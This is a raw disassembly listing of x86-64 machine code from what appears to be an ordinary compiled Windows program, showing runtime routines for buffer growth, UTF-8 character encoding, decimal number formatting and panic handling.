   140002e0e:	e8 7d fd ff ff       	call   0x140002b90
   140002e13:	48 8b 5d 00          	mov    0x0(%rbp),%rbx
   140002e17:	4c 8b 75 f0          	mov    -0x10(%rbp),%r14
   140002e1b:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
   140002e1f:	e9 c3 fe ff ff       	jmp    0x140002ce7
   140002e24:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e28:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140002e2e:	48 89 da             	mov    %rbx,%rdx
   140002e31:	e8 5a fd ff ff       	call   0x140002b90
   140002e36:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
   140002e3a:	48 8b 5d 00          	mov    0x0(%rbp),%rbx
   140002e3e:	e9 cb fe ff ff       	jmp    0x140002d0e
   140002e43:	48 8d 0d 26 31 86 00 	lea    0x863126(%rip),%rcx        # 0x140865f70
   140002e4a:	e8 01 fd ff ff       	call   0x140002b50
   140002e4f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002e54:	4c 89 f2             	mov    %r14,%rdx
   140002e57:	e8 cf fc ff ff       	call   0x140002b2b
   140002e5c:	eb 00                	jmp    0x140002e5e
   140002e5e:	48 89 c6             	mov    %rax,%rsi
   140002e61:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140002e66:	74 0e                	je     0x140002e76
   140002e68:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140002e6c:	ba 01 00 00 00       	mov    $0x1,%edx
   140002e71:	e8 da f9 ff ff       	call   0x140002850
   140002e76:	48 89 f1             	mov    %rsi,%rcx
   140002e79:	e8 d2 ec 03 00       	call   0x140041b50
   140002e7e:	cc                   	int3
   140002e7f:	90                   	nop
   140002e80:	55                   	push   %rbp
   140002e81:	41 56                	push   %r14
   140002e83:	56                   	push   %rsi
   140002e84:	57                   	push   %rdi
   140002e85:	53                   	push   %rbx
   140002e86:	48 83 ec 50          	sub    $0x50,%rsp
   140002e8a:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140002e8f:	48 89 d7             	mov    %rdx,%rdi
   140002e92:	48 89 ce             	mov    %rcx,%rsi
   140002e95:	4c 8b 72 08          	mov    0x8(%rdx),%r14
   140002e99:	4d 85 f6             	test   %r14,%r14
   140002e9c:	74 34                	je     0x140002ed2
   140002e9e:	48 8b 07             	mov    (%rdi),%rax
   140002ea1:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002ea5:	31 db                	xor    %ebx,%ebx
   140002ea7:	4c 89 f2             	mov    %r14,%rdx
   140002eaa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002eb0:	48 03 19             	add    (%rcx),%rbx
   140002eb3:	48 83 c1 10          	add    $0x10,%rcx
   140002eb7:	48 ff ca             	dec    %rdx
   140002eba:	75 f4                	jne    0x140002eb0
   140002ebc:	48 83 7f 18 00       	cmpq   $0x0,0x18(%rdi)
   140002ec1:	74 27                	je     0x140002eea
   140002ec3:	48 83 fb 0f          	cmp    $0xf,%rbx
   140002ec7:	77 12                	ja     0x140002edb
   140002ec9:	48 83 78 08 00       	cmpq   $0x0,0x8(%rax)
   140002ece:	74 3f                	je     0x140002f0f
   140002ed0:	eb 09                	jmp    0x140002edb
   140002ed2:	48 83 7f 18 00       	cmpq   $0x0,0x18(%rdi)
   140002ed7:	74 36                	je     0x140002f0f
   140002ed9:	31 db                	xor    %ebx,%ebx
   140002edb:	31 c0                	xor    %eax,%eax
   140002edd:	48 85 db             	test   %rbx,%rbx
   140002ee0:	48 0f 4f c3          	cmovg  %rbx,%rax
   140002ee4:	48 01 c0             	add    %rax,%rax
   140002ee7:	48 89 c3             	mov    %rax,%rbx
   140002eea:	48 85 db             	test   %rbx,%rbx
   140002eed:	0f 88 97 00 00 00    	js     0x140002f8a
   140002ef3:	74 1a                	je     0x140002f0f
   140002ef5:	48 89 d9             	mov    %rbx,%rcx
   140002ef8:	e8 a3 de 03 00       	call   0x140040da0
   140002efd:	48 85 c0             	test   %rax,%rax
   140002f00:	75 14                	jne    0x140002f16
   140002f02:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002f07:	48 89 da             	mov    %rbx,%rdx
   140002f0a:	e8 1c fc ff ff       	call   0x140002b2b
   140002f0f:	b8 01 00 00 00       	mov    $0x1,%eax
   140002f14:	31 db                	xor    %ebx,%ebx
   140002f16:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   140002f1a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002f1e:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
   140002f25:	00 
   140002f26:	49 83 fe 01          	cmp    $0x1,%r14
   140002f2a:	74 03                	je     0x140002f2f
   140002f2c:	4d 85 f6             	test   %r14,%r14
   140002f2f:	48 8d 15 aa 2f 86 00 	lea    0x862faa(%rip),%rdx        # 0x140865ee0
   140002f36:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140002f3a:	49 89 f8             	mov    %rdi,%r8
   140002f3d:	e8 ee 0d 00 00       	call   0x140003d30
   140002f42:	84 c0                	test   %al,%al
   140002f44:	75 1a                	jne    0x140002f60
   140002f46:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002f4a:	48 89 46 10          	mov    %rax,0x10(%rsi)
   140002f4e:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   140002f52:	0f 11 06             	movups %xmm0,(%rsi)
   140002f55:	48 83 c4 50          	add    $0x50,%rsp
   140002f59:	5b                   	pop    %rbx
   140002f5a:	5f                   	pop    %rdi
   140002f5b:	5e                   	pop    %rsi
   140002f5c:	41 5e                	pop    %r14
   140002f5e:	5d                   	pop    %rbp
   140002f5f:	c3                   	ret
   140002f60:	48 8d 05 41 30 86 00 	lea    0x863041(%rip),%rax        # 0x140865fa8
   140002f67:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002f6c:	48 8d 0d f5 65 86 00 	lea    0x8665f5(%rip),%rcx        # 0x140869568
   140002f73:	4c 8d 0d 46 2f 86 00 	lea    0x862f46(%rip),%r9        # 0x140865ec0
   140002f7a:	4c 8d 45 ff          	lea    -0x1(%rbp),%r8
   140002f7e:	ba 56 00 00 00       	mov    $0x56,%edx
   140002f83:	e8 a8 23 00 00       	call   0x140005330
   140002f88:	0f 0b                	ud2
   140002f8a:	48 8d 0d df 2f 86 00 	lea    0x862fdf(%rip),%rcx        # 0x140865f70
   140002f91:	e8 ba fb ff ff       	call   0x140002b50
   140002f96:	48 89 c6             	mov    %rax,%rsi
   140002f99:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
   140002f9e:	74 0e                	je     0x140002fae
   140002fa0:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002fa4:	ba 01 00 00 00       	mov    $0x1,%edx
   140002fa9:	e8 a2 f8 ff ff       	call   0x140002850
   140002fae:	48 89 f1             	mov    %rsi,%rcx
   140002fb1:	e8 9a eb 03 00       	call   0x140041b50
   140002fb6:	cc                   	int3
   140002fb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002fbe:	00 00 
   140002fc0:	48 8b 0a             	mov    (%rdx),%rcx
   140002fc3:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140002fc7:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002fcb:	48 8d 15 70 64 86 00 	lea    0x866470(%rip),%rdx        # 0x140869442
   140002fd2:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   140002fd8:	48 ff e0             	rex.W jmp *%rax
   140002fdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002fe0:	48 83 39 00          	cmpq   $0x0,(%rcx)
   140002fe4:	74 0e                	je     0x140002ff4
   140002fe6:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140002fea:	ba 01 00 00 00       	mov    $0x1,%edx
   140002fef:	e9 5c f8 ff ff       	jmp    0x140002850
   140002ff4:	c3                   	ret
   140002ff5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002ffc:	00 00 00 00 
   140003000:	55                   	push   %rbp
   140003001:	41 56                	push   %r14
   140003003:	56                   	push   %rsi
   140003004:	57                   	push   %rdi
   140003005:	53                   	push   %rbx
   140003006:	48 83 ec 20          	sub    $0x20,%rsp
   14000300a:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000300f:	4c 89 c6             	mov    %r8,%rsi
   140003012:	48 89 cf             	mov    %rcx,%rdi
   140003015:	48 8b 01             	mov    (%rcx),%rax
   140003018:	48 8b 59 10          	mov    0x10(%rcx),%rbx
   14000301c:	48 29 d8             	sub    %rbx,%rax
   14000301f:	49 39 c0             	cmp    %rax,%r8
   140003022:	77 23                	ja     0x140003047
   140003024:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140003028:	48 01 d9             	add    %rbx,%rcx
   14000302b:	49 89 f0             	mov    %rsi,%r8
   14000302e:	e8 2d ef 03 00       	call   0x140041f60
   140003033:	48 01 f3             	add    %rsi,%rbx
   140003036:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   14000303a:	31 c0                	xor    %eax,%eax
   14000303c:	48 83 c4 20          	add    $0x20,%rsp
   140003040:	5b                   	pop    %rbx
   140003041:	5f                   	pop    %rdi
   140003042:	5e                   	pop    %rsi
   140003043:	41 5e                	pop    %r14
   140003045:	5d                   	pop    %rbp
   140003046:	c3                   	ret
   140003047:	48 89 f9             	mov    %rdi,%rcx
   14000304a:	49 89 d6             	mov    %rdx,%r14
   14000304d:	48 89 da             	mov    %rbx,%rdx
   140003050:	49 89 f0             	mov    %rsi,%r8
   140003053:	e8 38 fb ff ff       	call   0x140002b90
   140003058:	4c 89 f2             	mov    %r14,%rdx
   14000305b:	48 8b 5f 10          	mov    0x10(%rdi),%rbx
   14000305f:	eb c3                	jmp    0x140003024
   140003061:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003068:	0f 1f 84 00 00 00 00 
   14000306f:	00 
   140003070:	55                   	push   %rbp
   140003071:	41 56                	push   %r14
   140003073:	56                   	push   %rsi
   140003074:	57                   	push   %rdi
   140003075:	53                   	push   %rbx
   140003076:	48 83 ec 20          	sub    $0x20,%rsp
   14000307a:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000307f:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   140003083:	bf 01 00 00 00       	mov    $0x1,%edi
   140003088:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   14000308e:	72 1c                	jb     0x1400030ac
   140003090:	bf 02 00 00 00       	mov    $0x2,%edi
   140003095:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   14000309b:	72 0f                	jb     0x1400030ac
   14000309d:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   1400030a3:	bf 04 00 00 00       	mov    $0x4,%edi
   1400030a8:	48 83 df 00          	sbb    $0x0,%rdi
   1400030ac:	4c 8b 01             	mov    (%rcx),%r8
   1400030af:	49 29 f0             	sub    %rsi,%r8
   1400030b2:	48 89 f0             	mov    %rsi,%rax
   1400030b5:	4c 39 c7             	cmp    %r8,%rdi
   1400030b8:	0f 87 c1 00 00 00    	ja     0x14000317f
   1400030be:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   1400030c2:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   1400030c8:	73 09                	jae    0x1400030d3
   1400030ca:	41 88 14 00          	mov    %dl,(%r8,%rax,1)
   1400030ce:	e9 98 00 00 00       	jmp    0x14000316b
   1400030d3:	41 89 d1             	mov    %edx,%r9d
   1400030d6:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   1400030dc:	73 19                	jae    0x1400030f7
   1400030de:	41 c1 e9 06          	shr    $0x6,%r9d
   1400030e2:	41 80 c9 c0          	or     $0xc0,%r9b
   1400030e6:	45 88 0c 00          	mov    %r9b,(%r8,%rax,1)
   1400030ea:	80 e2 3f             	and    $0x3f,%dl
   1400030ed:	80 ca 80             	or     $0x80,%dl
   1400030f0:	41 88 54 00 01       	mov    %dl,0x1(%r8,%rax,1)
   1400030f5:	eb 74                	jmp    0x14000316b
   1400030f7:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   1400030fd:	73 2d                	jae    0x14000312c
   1400030ff:	41 c1 e9 0c          	shr    $0xc,%r9d
   140003103:	41 80 c9 e0          	or     $0xe0,%r9b
   140003107:	45 88 0c 00          	mov    %r9b,(%r8,%rax,1)
   14000310b:	41 89 d1             	mov    %edx,%r9d
   14000310e:	41 c1 e9 06          	shr    $0x6,%r9d
   140003112:	41 80 e1 3f          	and    $0x3f,%r9b
   140003116:	41 80 c9 80          	or     $0x80,%r9b
   14000311a:	45 88 4c 00 01       	mov    %r9b,0x1(%r8,%rax,1)
   14000311f:	80 e2 3f             	and    $0x3f,%dl
   140003122:	80 ca 80             	or     $0x80,%dl
   140003125:	41 88 54 00 02       	mov    %dl,0x2(%r8,%rax,1)
   14000312a:	eb 3f                	jmp    0x14000316b
   14000312c:	41 c1 e9 12          	shr    $0x12,%r9d
   140003130:	41 80 c9 f0          	or     $0xf0,%r9b
   140003134:	45 88 0c 00          	mov    %r9b,(%r8,%rax,1)
   140003138:	41 89 d1             	mov    %edx,%r9d
   14000313b:	41 c1 e9 0c          	shr    $0xc,%r9d
   14000313f:	41 80 e1 3f          	and    $0x3f,%r9b
   140003143:	41 80 c9 80          	or     $0x80,%r9b
   140003147:	45 88 4c 00 01       	mov    %r9b,0x1(%r8,%rax,1)
   14000314c:	41 89 d1             	mov    %edx,%r9d
   14000314f:	41 c1 e9 06          	shr    $0x6,%r9d
   140003153:	41 80 e1 3f          	and    $0x3f,%r9b
   140003157:	41 80 c9 80          	or     $0x80,%r9b
   14000315b:	45 88 4c 00 02       	mov    %r9b,0x2(%r8,%rax,1)
   140003160:	80 e2 3f             	and    $0x3f,%dl
   140003163:	80 ca 80             	or     $0x80,%dl
   140003166:	41 88 54 00 03       	mov    %dl,0x3(%r8,%rax,1)
   14000316b:	48 01 f7             	add    %rsi,%rdi
   14000316e:	48 89 79 10          	mov    %rdi,0x10(%rcx)
   140003172:	31 c0                	xor    %eax,%eax
   140003174:	48 83 c4 20          	add    $0x20,%rsp
   140003178:	5b                   	pop    %rbx
   140003179:	5f                   	pop    %rdi
   14000317a:	5e                   	pop    %rsi
   14000317b:	41 5e                	pop    %r14
   14000317d:	5d                   	pop    %rbp
   14000317e:	c3                   	ret
   14000317f:	48 89 cb             	mov    %rcx,%rbx
   140003182:	41 89 d6             	mov    %edx,%r14d
   140003185:	48 89 f2             	mov    %rsi,%rdx
   140003188:	49 89 f8             	mov    %rdi,%r8
   14000318b:	e8 00 fa ff ff       	call   0x140002b90
   140003190:	44 89 f2             	mov    %r14d,%edx
   140003193:	48 89 d9             	mov    %rbx,%rcx
   140003196:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000319a:	e9 1f ff ff ff       	jmp    0x1400030be
   14000319f:	90                   	nop
   1400031a0:	49 89 d0             	mov    %rdx,%r8
   1400031a3:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1400031a7:	48 83 f8 01          	cmp    $0x1,%rax
   1400031ab:	74 03                	je     0x1400031b0
   1400031ad:	48 85 c0             	test   %rax,%rax
   1400031b0:	48 8d 15 29 2d 86 00 	lea    0x862d29(%rip),%rdx        # 0x140865ee0
   1400031b7:	e9 74 0b 00 00       	jmp    0x140003d30
   1400031bc:	55                   	push   %rbp
   1400031bd:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400031c4:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400031cb:	00 
   1400031cc:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   1400031d0:	48 89 08             	mov    %rcx,(%rax)
   1400031d3:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400031d7:	48 89 11             	mov    %rdx,(%rcx)
   1400031da:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   1400031de:	48 89 0a             	mov    %rcx,(%rdx)
   1400031e1:	4c 8d 0d 48 00 00 00 	lea    0x48(%rip),%r9        # 0x140003230
   1400031e8:	4c 89 4a 08          	mov    %r9,0x8(%rdx)
   1400031ec:	4c 8d 15 85 31 86 00 	lea    0x863185(%rip),%r10        # 0x140866378
   1400031f3:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400031f7:	4c 89 11             	mov    %r10,(%rcx)
   1400031fa:	41 ba 02 00 00 00    	mov    $0x2,%r10d
   140003200:	4c 89 51 08          	mov    %r10,0x8(%rcx)
   140003204:	48 83 61 20 00       	andq   $0x0,0x20(%rcx)
   140003209:	48 89 42 10          	mov    %rax,0x10(%rdx)
   14000320d:	4c 89 4a 18          	mov    %r9,0x18(%rdx)
   140003211:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   140003215:	4c 89 51 18          	mov    %r10,0x18(%rcx)
   140003219:	4c 89 c2             	mov    %r8,%rdx
   14000321c:	e8 2f 01 00 00       	call   0x140003350
   140003221:	cc                   	int3
   140003222:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003229:	1f 84 00 00 00 00 00 
   140003230:	55                   	push   %rbp
   140003231:	41 56                	push   %r14
   140003233:	56                   	push   %rsi
   140003234:	57                   	push   %rdi
   140003235:	53                   	push   %rbx
   140003236:	48 83 ec 50          	sub    $0x50,%rsp
   14000323a:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000323f:	49 89 d1             	mov    %rdx,%r9
   140003242:	4c 8b 19             	mov    (%rcx),%r11
   140003245:	41 b8 14 00 00 00    	mov    $0x14,%r8d
   14000324b:	4c 8d 15 b9 32 86 00 	lea    0x8632b9(%rip),%r10        # 0x14086650b
   140003252:	4c 89 da             	mov    %r11,%rdx
   140003255:	49 81 fb e8 03 00 00 	cmp    $0x3e8,%r11
   14000325c:	72 60                	jb     0x1400032be
   14000325e:	bf 14 00 00 00       	mov    $0x14,%edi
   140003263:	48 be 4b 59 86 38 d6 	movabs $0x346dc5d63886594b,%rsi
   14000326a:	c5 6d 34 
   14000326d:	4c 89 d9             	mov    %r11,%rcx
   140003270:	4c 8d 47 fc          	lea    -0x4(%rdi),%r8
   140003274:	48 89 c8             	mov    %rcx,%rax
   140003277:	48 f7 e6             	mul    %rsi
   14000327a:	48 c1 ea 0b          	shr    $0xb,%rdx
   14000327e:	69 c2 10 27 00 00    	imul   $0x2710,%edx,%eax
   140003284:	89 cb                	mov    %ecx,%ebx
   140003286:	29 c3                	sub    %eax,%ebx
   140003288:	69 c3 7b 14 00 00    	imul   $0x147b,%ebx,%eax
   14000328e:	c1 e8 13             	shr    $0x13,%eax
   140003291:	44 6b f0 64          	imul   $0x64,%eax,%r14d
   140003295:	44 29 f3             	sub    %r14d,%ebx
   140003298:	41 0f b7 04 42       	movzwl (%r10,%rax,2),%eax
   14000329d:	66 89 44 3d e8       	mov    %ax,-0x18(%rbp,%rdi,1)
   1400032a2:	0f b7 c3             	movzwl %bx,%eax
   1400032a5:	41 0f b7 04 42       	movzwl (%r10,%rax,2),%eax
   1400032aa:	66 89 44 3d ea       	mov    %ax,-0x16(%rbp,%rdi,1)
   1400032af:	4c 89 c7             	mov    %r8,%rdi
   1400032b2:	48 81 f9 7f 96 98 00 	cmp    $0x98967f,%rcx
   1400032b9:	48 89 d1             	mov    %rdx,%rcx
   1400032bc:	77 b2                	ja     0x140003270
   1400032be:	48 83 fa 09          	cmp    $0x9,%rdx
   1400032c2:	76 2b                	jbe    0x1400032ef
   1400032c4:	89 d0                	mov    %edx,%eax
   1400032c6:	c1 e8 02             	shr    $0x2,%eax
   1400032c9:	0f b7 c0             	movzwl %ax,%eax
   1400032cc:	69 c0 7b 14 00 00    	imul   $0x147b,%eax,%eax
   1400032d2:	c1 e8 11             	shr    $0x11,%eax
   1400032d5:	6b c8 64             	imul   $0x64,%eax,%ecx
   1400032d8:	29 ca                	sub    %ecx,%edx
   1400032da:	0f b7 ca             	movzwl %dx,%ecx
   1400032dd:	41 0f b7 0c 4a       	movzwl (%r10,%rcx,2),%ecx
   1400032e2:	66 42 89 4c 05 ea    	mov    %cx,-0x16(%rbp,%r8,1)
   1400032e8:	49 83 c0 fe          	add    $0xfffffffffffffffe,%r8
   1400032ec:	48 89 c2             	mov    %rax,%rdx
   1400032ef:	4d 85 db             	test   %r11,%r11
   1400032f2:	74 05                	je     0x1400032f9
   1400032f4:	48 85 d2             	test   %rdx,%rdx
   1400032f7:	74 11                	je     0x14000330a
   1400032f9:	83 e2 0f             	and    $0xf,%edx
   1400032fc:	41 0f b6 44 52 01    	movzbl 0x1(%r10,%rdx,2),%eax
   140003302:	42 88 44 05 eb       	mov    %al,-0x15(%rbp,%r8,1)
   140003307:	49 ff c8             	dec    %r8
   14000330a:	b8 14 00 00 00       	mov    $0x14,%eax
   14000330f:	4c 29 c0             	sub    %r8,%rax
   140003312:	49 8d 0c 28          	lea    (%r8,%rbp,1),%rcx
   140003316:	48 83 c1 ec          	add    $0xffffffffffffffec,%rcx
   14000331a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000331f:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003324:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000332a:	4c 89 c9             	mov    %r9,%rcx
   14000332d:	b2 01                	mov    $0x1,%dl
   14000332f:	45 31 c9             	xor    %r9d,%r9d
   140003332:	e8 49 00 00 00       	call   0x140003380
   140003337:	90                   	nop
   140003338:	48 83 c4 50          	add    $0x50,%rsp
   14000333c:	5b                   	pop    %rbx
   14000333d:	5f                   	pop    %rdi
   14000333e:	5e                   	pop    %rsi
   14000333f:	41 5e                	pop    %r14
   140003341:	5d                   	pop    %rbp
   140003342:	c3                   	ret
   140003343:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000334a:	84 00 00 00 00 00 
   140003350:	55                   	push   %rbp
   140003351:	48 83 ec 40          	sub    $0x40,%rsp
   140003355:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000335a:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   14000335e:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140003362:	66 c7 45 f8 01 00    	movw   $0x1,-0x8(%rbp)
   140003368:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   14000336c:	e8 4f e1 03 00       	call   0x1400414c0
   140003371:	cc                   	int3
   140003372:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003379:	1f 84 00 00 00 00 00 
   140003380:	55                   	push   %rbp
   140003381:	41 57                	push   %r15
   140003383:	41 56                	push   %r14
   140003385:	41 55                	push   %r13
   140003387:	41 54                	push   %r12
   140003389:	56                   	push   %rsi
   14000338a:	57                   	push   %rdi
   14000338b:	53                   	push   %rbx
   14000338c:	48 83 ec 58          	sub    $0x58,%rsp
   140003390:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140003395:	4d 89 ce             	mov    %r9,%r14
   140003398:	4c 89 c3             	mov    %r8,%rbx
   14000339b:	48 8b 75 78          	mov    0x78(%rbp),%rsi
   14000339f:	84 d2                	test   %dl,%dl
   1400033a1:	74 58                	je     0x1400033fb
   1400033a3:	8b 79 10             	mov    0x10(%rcx),%edi
   1400033a6:	41 89 f9             	mov    %edi,%r9d
   1400033a9:	41 81 e1 00 00 20 00 	and    $0x200000,%r9d
   1400033b0:	b8 00 00 11 00       	mov    $0x110000,%eax
   1400033b5:	41 b8 2b 00 00 00    	mov    $0x2b,%r8d
   1400033bb:	44 0f 44 c0          	cmove  %eax,%r8d
   1400033bf:	41 c1 e9 15          	shr    $0x15,%r9d
   1400033c3:	49 01 f1             	add    %rsi,%r9
   1400033c6:	f7 c7 00 00 80 00    	test   $0x800000,%edi
   1400033cc:	74 42                	je     0x140003410
   1400033ce:	31 c0                	xor    %eax,%eax
   1400033d0:	4d 85 f6             	test   %r14,%r14
   1400033d3:	74 21                	je     0x1400033f6
   1400033d5:	31 d2                	xor    %edx,%edx
   1400033d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400033de:	00 00 
   1400033e0:	45 31 d2             	xor    %r10d,%r10d
   1400033e3:	80 3c 13 c0          	cmpb   $0xc0,(%rbx,%rdx,1)
   1400033e7:	41 0f 9d c2          	setge  %r10b
   1400033eb:	4c 01 d0             	add    %r10,%rax
   1400033ee:	48 ff c2             	inc    %rdx
   1400033f1:	49 39 d6             	cmp    %rdx,%r14
   1400033f4:	75 ea                	jne    0x1400033e0
   1400033f6:	49 01 c1             	add    %rax,%r9
   1400033f9:	eb 17                	jmp    0x140003412
   1400033fb:	4c 8d 4e 01          	lea    0x1(%rsi),%r9
   1400033ff:	8b 79 10             	mov    0x10(%rcx),%edi
   140003402:	41 b8 2d 00 00 00    	mov    $0x2d,%r8d
   140003408:	f7 c7 00 00 80 00    	test   $0x800000,%edi
   14000340e:	75 be                	jne    0x1400033ce
   140003410:	31 db                	xor    %ebx,%ebx
   140003412:	4c 8b 6d 70          	mov    0x70(%rbp),%r13
   140003416:	44 0f b7 79 14       	movzwl 0x14(%rcx),%r15d
   14000341b:	4d 39 f9             	cmp    %r15,%r9
   14000341e:	73 42                	jae    0x140003462
   140003420:	f7 c7 00 00 00 01    	test   $0x1000000,%edi
   140003426:	4c 89 6d e8          	mov    %r13,-0x18(%rbp)
   14000342a:	75 7b                	jne    0x1400034a7
   14000342c:	45 89 fa             	mov    %r15d,%r10d
   14000342f:	45 29 ca             	sub    %r9d,%r10d
   140003432:	89 f8                	mov    %edi,%eax
   140003434:	c1 e8 1d             	shr    $0x1d,%eax
   140003437:	83 e0 03             	and    $0x3,%eax
   14000343a:	48 8d 15 cf 1b 04 00 	lea    0x41bcf(%rip),%rdx        # 0x140045010
   140003441:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140003445:	48 01 d0             	add    %rdx,%rax
   140003448:	48 89 75 d8          	mov    %rsi,-0x28(%rbp)
   14000344c:	4c 89 4d e0          	mov    %r9,-0x20(%rbp)
   140003450:	44 89 45 f4          	mov    %r8d,-0xc(%rbp)
   140003454:	44 89 55 00          	mov    %r10d,0x0(%rbp)
   140003458:	ff e0                	jmp    *%rax
   14000345a:	44 89 d0             	mov    %r10d,%eax
   14000345d:	e9 e9 00 00 00       	jmp    0x14000354b
   140003462:	48 8b 39             	mov    (%rcx),%rdi
   140003465:	4c 8b 61 08          	mov    0x8(%rcx),%r12
   140003469:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000346e:	48 89 f9             	mov    %rdi,%rcx
   140003471:	4c 89 e2             	mov    %r12,%rdx
   140003474:	49 89 d9             	mov    %rbx,%r9
   140003477:	e8 94 03 00 00       	call   0x140003810
   14000347c:	b3 01                	mov    $0x1,%bl
   14000347e:	84 c0                	test   %al,%al
   140003480:	0f 85 61 01 00 00    	jne    0x1400035e7
   140003486:	49 8b 44 24 18       	mov    0x18(%r12),%rax
   14000348b:	48 89 f9             	mov    %rdi,%rcx
   14000348e:	4c 89 ea             	mov    %r13,%rdx
   140003491:	49 89 f0             	mov    %rsi,%r8
   140003494:	48 83 c4 58          	add    $0x58,%rsp
   140003498:	5b                   	pop    %rbx
   140003499:	5f                   	pop    %rdi
   14000349a:	5e                   	pop    %rsi
   14000349b:	41 5c                	pop    %r12
   14000349d:	41 5d                	pop    %r13
   14000349f:	41 5e                	pop    %r14
   1400034a1:	41 5f                	pop    %r15
   1400034a3:	5d                   	pop    %rbp
   1400034a4:	48 ff e0             	rex.W jmp *%rax
   1400034a7:	4d 89 cd             	mov    %r9,%r13
   1400034aa:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400034ae:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400034b2:	25 00 00 e0 9f       	and    $0x9fe00000,%eax
   1400034b7:	0d 30 00 00 20       	or     $0x20000030,%eax
   1400034bc:	89 41 10             	mov    %eax,0x10(%rcx)
   1400034bf:	4c 8b 21             	mov    (%rcx),%r12
   1400034c2:	48 89 4d 00          	mov    %rcx,0x0(%rbp)
   1400034c6:	48 8b 79 08          	mov    0x8(%rcx),%rdi
   1400034ca:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400034cf:	4c 89 e1             	mov    %r12,%rcx
   1400034d2:	48 89 fa             	mov    %rdi,%rdx
   1400034d5:	49 89 d9             	mov    %rbx,%r9
   1400034d8:	e8 33 03 00 00       	call   0x140003810
   1400034dd:	b3 01                	mov    $0x1,%bl
   1400034df:	84 c0                	test   %al,%al
   1400034e1:	0f 85 00 01 00 00    	jne    0x1400035e7
   1400034e7:	45 29 ef             	sub    %r13d,%r15d
   1400034ea:	41 ff c7             	inc    %r15d
   1400034ed:	4c 8b 75 e8          	mov    -0x18(%rbp),%r14
   1400034f1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400034f8:	0f 1f 84 00 00 00 00 
   1400034ff:	00 
   140003500:	66 41 ff cf          	dec    %r15w
   140003504:	74 14                	je     0x14000351a
   140003506:	4c 89 e1             	mov    %r12,%rcx
   140003509:	ba 30 00 00 00       	mov    $0x30,%edx
   14000350e:	ff 57 20             	call   *0x20(%rdi)
   140003511:	84 c0                	test   %al,%al
   140003513:	74 eb                	je     0x140003500
   140003515:	e9 cd 00 00 00       	jmp    0x1400035e7
   14000351a:	4c 89 e1             	mov    %r12,%rcx
   14000351d:	4c 89 f2             	mov    %r14,%rdx
   140003520:	49 89 f0             	mov    %rsi,%r8
   140003523:	ff 57 18             	call   *0x18(%rdi)
